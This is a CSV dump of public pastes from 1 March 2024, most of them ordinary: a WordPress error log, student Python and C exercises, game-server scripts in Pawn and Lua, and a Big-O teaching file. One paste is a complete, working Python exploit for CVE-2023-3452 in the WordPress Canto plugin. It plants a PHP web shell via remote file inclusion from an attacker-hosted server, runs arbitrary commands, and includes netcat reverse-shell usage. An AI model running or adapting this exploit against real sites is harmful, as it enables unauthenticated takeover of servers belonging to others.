id,title,username,language,date,content
636b4REJ,LOG_WOO,laciikee,Apache Log,Friday 1st of March 2024 09:31:18 AM CDT,"2024-03-01T07:37:29+00:00 CRITICAL Uncaught Error: Failed opening required '/data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/src/heureka/HeurekaOvereno.php' (include_path='.:/usr/share/php') in /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/ceske-sluzby.php:51
Stack trace:
#0 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(326): ceske_sluzby_heureka_overeno_zakazniky(974123, Array)
#1 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters('', Array)
#2 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#3 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-checkout.php(1267): do_action('woocommerce_che...', 974123, Array, Object(Automattic\WooCommerce\Admin\Overrides\Order))
#4 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-ajax.php(508): WC_Checkout->process_checkout()
#5 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(324): WC_AJAX::checkout('')
#6 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters('', Array)
#7 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#8 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-ajax.php(96): do_action('wc_ajax_checkou...')
#9 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(324): WC_AJAX::do_wc_ajax('')
#10 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters(false, Array)
#11 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#12 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/template-loader.php(13): do_action('template_redire...')
#13 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-blog-header.php(19): require_once('/data/0/4/04b8b...')
#14 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/index.php(17): require('/data/0/4/04b8b...')
#15 {main}
  thrown v /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/ceske-sluzby.php na riadku 51
"
HAJkeAb3,Тип №9. Задание №57416,Rakabidasta,Python,Friday 1st of March 2024 09:29:23 AM CDT,"f = """"""Тут строки из задания""""""
f = f.split(""\n"")
count = 0
for line in f:
    l = [int(x) for x in line.split(""\t"")]
    n = [l.count(number) for number in l]
    maxn = max(l)
    minn = min(l)
    vseost = sum(l) - maxn - minn
    if sum(n) == 5 and 2*(maxn+minn) <= vseost:
        count += 1
print(count)"
RjT6nBv7,LAB1_PNS_EX1,Bobita,C,Friday 1st of March 2024 09:26:44 AM CDT,"/*****************************************************************************
 * lab1.c
 *****************************************************************************/

#include <sys/platform.h>
#include ""adi_initialize.h""
#include ""lab1.h""
#include <cdefBF537.h>

/** 
 * If you want to use command program arguments, then place them in the following string. 
 */
char __argv_string[] = """";

/*[COD_EXPLICAT_LAB]:
//*pPORTFIO_DIR |= (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 10) | (1 << 11);
//*pPORTFIO |= (1 << 7);
//*pPORTFIO_INEN |= (1 << 2);
//	while(1){
//		if(*pPORTFIO & (1 << 2))
//		{
//			while(*pPORTFIO & (1 << 2));
//
//			*pPORTFIO |= (1 << 7);
//		}
//	}
 *
 * */


int main(int argc, char *argv[])
{
	/**
	 * Initialize managed drivers and/or services that have been added to
	 * the project.
	 * @return zero on success
	 */

	adi_initComponents();
	
	/* Begin adding your custom code here */
	*pPORTFIO_DIR |= (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 10) | (1 << 11);

	*pPORTFIO_INEN |= (1 << 2);

	*pPORTFIO |= (1 << 6);

	volatile unsigned int i;

	while(1)
	{
		for (i = 0; i < 99999999; i++);
		*pPORTFIO |= (1 << 6);
		for (i = 0; i < 9999; i++);
		*pPORTFIO &= ~(1 << 6);
	}
 	return 0;
}

"
J8jD31bJ,Untitled,goiaba123z,Pawn,Friday 1st of March 2024 09:25:32 AM CDT,"	CMD:cv(playerid, params[])
	{
		new CarroVip, Cor1, Cor2;
		if(!PlayerDados[playerid][Vip]) return SendClientMessage(playerid, -1, ""Voce precisa ser Vip para usar este comando!"");
		if(sscanf(params, ""iii"", CarroVip, Cor1, Cor2)) return SendClientMessage(playerid, -1, ""/cv [vehicleid] [cor1] [cor2]"");
		new Float:playerX, Float:playerY, Float:playerZ, Float:playerAngle;

		GetPlayerPos(playerid, playerX, playerY, playerZ);
    	GetPlayerFacingAngle(playerid, playerAngle);
		DestroyVehicle(CarroDono[playerid]);
		CarroDono[playerid] = CreateVehicle(CarroVip, playerX, playerY, playerZ, playerAngle, Cor1, Cor2, 1);
		PutPlayerInVehicle(playerid, CarroDono[playerid], 0);
		return 1;
	}"
tbLkFnvD,Cams Server,GarridoR10,Lua,Friday 1st of March 2024 09:25:28 AM CDT,"Config.SecurityCameras = {
    hideradar = false,
    cameras = {
        {label = ""Pacific Bank CAM#1"", coords = vec3(257.45, 210.07, 109.08), r = {x = -25.0, y = 0.0, z = 28.05}, canRotate = false, isOnline = true},
        {label = ""Pacific Bank CAM#2"", coords = vec3(232.86, 221.46, 107.83), r = {x = -25.0, y = 0.0, z = -140.91}, canRotate = false, isOnline = true},
        {label = ""Pacific Bank CAM#3"", coords = vec3(252.27, 225.52, 103.99), r = {x = -35.0, y = 0.0, z = -74.87}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Grove St. CAM#1"", coords = vec3(-53.1433, -1746.714, 31.546), r = {x = -35.0, y = 0.0, z = -168.9182}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Prosperity St. CAM#1"", coords = vec3(-1482.9, -380.463, 42.363), r = {x = -35.0, y = 0.0, z = 79.53281}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour San Andreas Ave. CAM#1"", coords = vec3(-1224.874, -911.094, 14.401), r = {x = -35.0, y = 0.0, z = -6.778894}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Ginger St. CAM#1"", coords = vec3(-718.153, -909.211, 21.49), r = {x = -35.0, y = 0.0, z = -137.1431}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Innocence Blvd. CAM#1"", coords = vec3(23.885, -1342.441, 31.672), r = {x = -35.0, y = 0.0, z = -142.9191}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour El Rancho Blvd. CAM#1"", coords = vec3(1133.024, -978.712, 48.515), r = {x = -35.0, y = 0.0, z = -137.302}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd West Mirror Drive CAM#1"", coords = vec3(1151.93, -320.389, 71.33), r = {x = -35.0, y = 0.0, z = -119.4468}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Clinton Ave CAM#1"", coords = vec3(383.402, 328.915, 105.541), r = {x = -35.0, y = 0.0, z = 118.585}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Banham Canyon Dr CAM#1"", coords = vec3(-1832.057, 789.389, 140.436), r = {x = -35.0, y = 0.0, z = -91.481}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Great Ocean Hwy CAM#1"", coords = vec3(-2966.15, 387.067, 17.393), r = {x = -35.0, y = 0.0, z = 32.92229}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Ineseno Road CAM#1"", coords = vec3(-3046.749, 592.491, 9.808), r = {x = -35.0, y = 0.0, z = -116.673}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Barbareno Rd. CAM#1"", coords = vec3(-3246.489, 1010.408, 14.705), r = {x = -35.0, y = 0.0, z = -135.2151}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Route 68 CAM#1"", coords = vec3(539.773, 2664.904, 44.056), r = {x = -35.0, y = 0.0, z = -42.947}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Route 68 CAM#1"", coords = vec3(1169.855, 2711.493, 40.432), r = {x = -35.0, y = 0.0, z = 127.17}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Senora Fwy CAM#1"", coords = vec3(2673.579, 3281.265, 57.541), r = {x = -35.0, y = 0.0, z = -80.242}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Alhambra Dr. CAM#1"", coords = vec3(1966.24, 3749.545, 34.143), r = {x = -35.0, y = 0.0, z = 163.065}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Senora Fwy CAM#2"", coords = vec3(1729.522, 6419.87, 37.262), r = {x = -35.0, y = 0.0, z = -160.089}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Hawick Ave CAM#1"", coords = vec3(309.341, -281.439, 55.88), r = {x = -35.0, y = 0.0, z = -146.1595}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Legion Square CAM#1"", coords = vec3(144.871, -1043.044, 31.017), r = {x = -35.0, y = 0.0, z = -143.9796}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Hawick Ave CAM#2"", coords = vec3(-355.7643, -52.506, 50.746), r = {x = -35.0, y = 0.0, z = -143.8711}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Del Perro Blvd CAM#1"", coords = vec3(-1214.226, -335.86, 39.515), r = {x = -35.0, y = 0.0, z = -97.862}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Great Ocean Hwy CAM#1"", coords = vec3(-2958.885, 478.983, 17.406), r = {x = -35.0, y = 0.0, z = -34.69595}, canRotate = false, isOnline = true},
        {label = ""Paleto Bank CAM#1"", coords = vec3(-102.939, 6467.668, 33.424), r = {x = -35.0, y = 0.0, z = 24.66}, canRotate = false, isOnline = true},
        {label = ""Del Vecchio Liquor -- Paleto Bay"", coords = vec3(-163.75, 6323.45, 33.424), r = {x = -35.0, y = 0.0, z = 260.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#1"", coords = vec3(166.42, 6634.4, 33.69), r = {x = -35.0, y = 0.0, z = 32.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#2"", coords = vec3(163.74, 6644.34, 33.69), r = {x = -35.0, y = 0.0, z = 168.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#3"", coords = vec3(169.54, 6640.89, 33.69), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = false, isOnline = true},
        {label = ""Vangelico Jewelery CAM#1"", coords = vec3(-627.54, -239.74, 40.33), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#2"", coords = vec3(-627.51, -229.51, 40.24), r = {x = -35.0, y = 0.0, z = -95.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#3"", coords = vec3(-620.3, -224.31, 40.23), r = {x = -35.0, y = 0.0, z = 165.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#4"", coords = vec3(-622.57, -236.3, 40.31), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = true, isOnline = true},
        {label = ""Limited Ltd GrapeSeed CAM#1"", coords = vec3(1709.0, 4930.3, 44.00), r = {x = -25.0, y = 0.0, z = 98.0}, canRotate = false, isOnline = true},
        {label = ""24/7 Tataviam Mountains CAM#1"", coords = vec3(2558.8, 390.44, 110.8), r = {x = -25.0, y = 0.0, z = 140.0}, canRotate = false, isOnline = true},
        {label = ""Bobcat Entrada"", coords = vec3(914.0468, -2124.6125, 33.1238), r = {x = -25.0, y = 0.0, z = 37.6}, canRotate = false, isOnline = true},
        {label = ""Bobcat Corredor"", coords = vec3(900.1251, -2118.9685, 32.7513), r = {x = -25.0, y = 0.0, z = 153.5}, canRotate = false, isOnline = true},
        {label = ""Bobcat Cofre"", coords = vec3(886.1331, -2119.1904, 33.1385), r = {x = -25.0, y = 0.0, z = 195.35}, canRotate = false, isOnline = true},
        {label = ""Bobcat Corredor Trás"", coords = vec3(883.3436, -2112.6389, 33.1385), r = {x = -25.0, y = 0.0, z = 162.5}, canRotate = false, isOnline = true},
        {label = ""Bobcat Traseiras"", coords = vec3(892.5311, -2112.4558, 32.8785), r = {x = -25.0, y = 0.0, z = 44.1}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Legion Square"", coords = vec3(22.3243, -1107.5288, 32.5850), r = {x = -25.0, y = 0.0, z = 108.25}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Little Seoul"", coords = vec3(-666.1893, -943.9071, 24.2933), r = {x = -25.0, y = 0.0, z = 321.10}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Vespucci Boulevard"", coords = vec3(846.6937, -1025.0469, 30.6236), r = {x = -25.0, y = 0.0, z = 139.5}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Morning Wood"", coords = vec3(-1313.1063, -387.7838, 39.4933), r = {x = -25.0, y = 0.0, z = 215.5}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Popular Street"", coords = vec3(809.3751, -2157.2720, 32.4005), r = {x = -25.0, y = 0.0, z = 310.6}, canRotate = false, isOnline = true},
    },
}
"
sfn9HkkG,Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion and Remote Code Execution - CVE-2023-3452,FlyFar,Python,Friday 1st of March 2024 08:59:18 AM CDT,"# Exploit Title: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
# Date: 04/11/2023
# Exploit Author: Leopoldo Angulo (leoanggal1)
# Vendor Homepage: https://wordpress.org/plugins/canto/
# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip
# Version: All versions of Canto Plugin prior to 3.0.5
# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4
# CVE : CVE-2023-3452

#PoC Notes:
#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)
#This code exploits the improper handling of the wp_abspath variable in the following line of the ""download.php"" code:
#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...
#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.
# More information in Leoanggal1's Github

#!/usr/bin/python3
import argparse
import http.server
import socketserver
import threading
import requests
import os
import subprocess

# Define the default web shell
default_web_shell = ""<?php system($_GET['cmd']); ?>""

def create_admin_file(local_dir, local_shell=None):
    if not os.path.exists(local_dir):
        os.makedirs(local_dir)

    # If a local shell is provided, use it; otherwise, use the default web shell
    if local_shell:
        with open(f""{local_dir}/admin.php"", ""wb"") as admin_file:
            with open(local_shell, ""rb"") as original_file:
                admin_file.write(original_file.read())
    else:
        with open(f""{local_dir}/admin.php"", ""w"") as admin_file:
            admin_file.write(default_web_shell)

def start_local_server(local_port):
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((""0.0.0.0"", local_port), Handler)

    print(f""Local web server on port {local_port}..."")
    httpd.serve_forever()

    return httpd

def exploit_rfi(url, local_shell, local_host, local_port, command, nc_port):
    local_dir = ""wp-admin""
    create_admin_file(local_dir, local_shell)

    target_url = f""{url}/wp-content/plugins/canto/includes/lib/download.php""
    local_server = f""http://{local_host}:{local_port}""
    command = f""cmd={command}""

    if local_shell:
        # If a local shell is provided, start netcat on the specified port
        subprocess.Popen([""nc"", ""-lvp"", str(nc_port)])

    server_thread = threading.Thread(target=start_local_server, args=(local_port,))
    server_thread.daemon = True
    server_thread.start()

    exploit_url = f""{target_url}?wp_abspath={local_server}&{command}""
    print(f""Exploitation URL: {exploit_url}"")

    response = requests.get(exploit_url)
    print(""Server response:"")
    print(response.text)

    # Shutdown the local web server
    print(""Shutting down local web server..."")
    server_thread.join()

if __name__ == ""__main__"":
    examples = '''
    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
    '''
    parser = argparse.ArgumentParser(description=""Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452"", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument(""-u"", ""--url"", required=True, default=None,  help=""Vulnerable URL"")
    parser.add_argument(""-s"", ""--shell"", help=""Local file for web shell"")
    parser.add_argument(""-LHOST"", ""--local_host"", required=True, help=""Local web server IP"")
    parser.add_argument(""-LPORT"", ""--local_port"", help=""Local web server port"")
    parser.add_argument(""-c"", ""--command"", default=""whoami"", help=""Command to execute on the target"")
    parser.add_argument(""-NC_PORT"", ""--nc_port"", type=int, help=""Listener port for netcat"")

    try:
        args = parser.parse_args()

        if args.local_port is None:
            args.local_port = 8080  # Valor predeterminado si LPORT no se proporciona
        exploit_rfi(args.url, args.shell, args.local_host, int(args.local_port), args.command, args.nc_port)

    except SystemExit:
        parser.print_help()
            "
NZfkbZ2w,Big O notation,LEGEND2004,C++,Friday 1st of March 2024 08:40:04 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)
const int mod = 1e9 + 7;

signed main()
{
    fastio;
/*
    // O(1)
    int a , b;
    cin >> a >> b;
    cout << a + b;
    */
    /*
    // O(log n)
    int n , cnt = 0;
    cin >> n;
    while(n){
        cnt += (n % 2);
        n /= 2;
    }
    //cout << __builtin_popcount(n);
    cout << cnt;
    */
    /*
    // O(sqrt n)
    // 1 2 3 4 6 12
    // a * b = n
    // b = n / a
    int n , cnt = 0;
    cin >> n;
    vector<int> v;
    for(int i = 1; i * i <= n; i++){
        if(n % i)
            continue;
        cnt++;
        v.push_back(i);
        if(i * i != n){
            cnt++;
            v.push_back(n / i);
        }
    }
    sort(v.begin() , v.end());
    cout << cnt << '\n';;
    for(int i : v)
        cout << i << "" "";
    */
    /*
    // O(n)

    int n;
    cin >> n;
    int f = 1;
    for(int i = 1; i <= n; i++){
        f *= i;
        f %= mod;
    }
    cout << f;
    */
    /*
    // O(n  * log n)
    int n;
    cin >> n;
    vector<int> a(n);
    for(int i = 0; i < n; i++)
        cin >> a[i];

    sort(a.begin() , a.end()); // n logn

    for(int i : a)
        cout << i << "" "";
    */

    /*
    // O(n * n)
    int n;
    cin >> n;
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n; j++){
            cout << i * n + j + 1 << "" "";
        }
        cout << '\n';
    }

    */
    /*
    // O(2 ^ n)
    int n , k = 1;
    cin >> n;
    // (1 << n) = 2 ^ n
    for(int i = 0; i < (1 << n); i++){

    }
    */
    /*
    // O(n!)
    int n;
    cin >> n;
    vector<int> v;
    for(int i = 1; i <= n; i++){
        v.push_back(i);
    }
    sort(v.begin() , v.end());
    do{
        for(int i : v)
            cout << i << "" "";
        cout << '\n';
    }while(next_permutation(v.begin() , v.end()));
    */
    

}"
uPw4DuDu,YanModDukun,PapiGemezs,PHP,Friday 1st of March 2024 08:18:15 AM CDT,"{
   ""Dukun"": [
      {
         ""version"": 1.4
      }
   ]
}"
UVFaCzLW,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Friday 1st of March 2024 08:17:16 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 45, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 227, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 63, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1187, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 574, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
bJ2Ncatc,Review Pastebin Alternative,xxsa,PHP,Friday 1st of March 2024 08:09:11 AM CDT,https://pastes.io - Paste Tool - Pastebin Alternative since 2020
EAnpT8Ff,Untitled,h1n0t0r1,Python,Friday 1st of March 2024 08:01:09 AM CDT,"# Read user input
n = int(input())

# Logic
max_diff = 0
is_equal = True
previous_sum = 0

for i in range(n):
    first_num = int(input())
    second_num = int(input())
    pair_sum = first_num + second_num
    # On the first iteration we set min_sum, max_sum and pair_sum to first_num + second_num.
    if i == 0:
        previous_sum = pair_sum

    else:
        if pair_sum != previous_sum:
            diff = abs(previous_sum - pair_sum)
            if diff > max_diff:
                max_diff = diff
            is_equal = False
        previous_sum = pair_sum

if is_equal:
    print(f'Yes, value={pair_sum}')
else:
    print(f'No, maxdiff={max_diff}')"
pcDFJqEv,RCTurtle-Ars Nouveau Essence - ManualUpdate,untamemadman,Lua,Friday 1st of March 2024 07:49:55 AM CDT,"-- pastebin run pcDFJqEv

shell.run(""delete startup"")
shell.run(""pastebin get KUfFwFi5 startup"")
shell.run(""reboot"")"
